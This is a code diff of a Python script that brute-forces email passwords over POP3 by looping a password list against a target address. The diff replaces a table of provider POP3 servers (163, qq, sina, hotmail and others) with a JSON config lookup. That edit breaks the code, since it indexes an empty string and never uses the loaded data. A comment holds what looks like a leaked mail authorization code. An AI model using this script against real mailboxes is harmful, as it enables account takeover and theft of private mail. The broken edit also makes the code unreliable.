@@ -1,4 +1,4 @@
-import poplib, string
+import poplib, string,json
 def brute_tencent(serverName,user, pwd):
     PopServer = poplib.POP3(serverName)
     #print PopServer.getwelcome()
@@ -14,22 +14,15 @@ def brute_tencent(serverName,user, pwd):
 def get_emailType(email):
     email = email.split(".")
     email = email[0].split("@")
-    serverName ={
-        'sina':'pop3.sina.com.cn',
-        'sohu':'pop3.sohu.com',
-        '126':'pop.126.com',
-        '139':'POP.139.com',
-        '163':'pop.163.com',
-        'qq':'pop.qq.com',
-        'exmail':'pop.exmail.qq.com',
-        'yahoo':'pop.mail.yahoo.com',
-        'hotmail':'pop3.live.com',
-    }
+    serverName = ""
+    with open('./serverNameConfig.json','r')as fp:
+        json_data = json.load(fp)
+        print('json',json_data)
     return serverName[email[1]]
 
 
 mail = "xxx@163.com"
-pwds = ['xx','xx','xx']
+pwds = ["xx","xx","xx"]
 #ejfjucqqjucvbegd
 serverName = get_emailType(mail)
 for pwd in pwds:
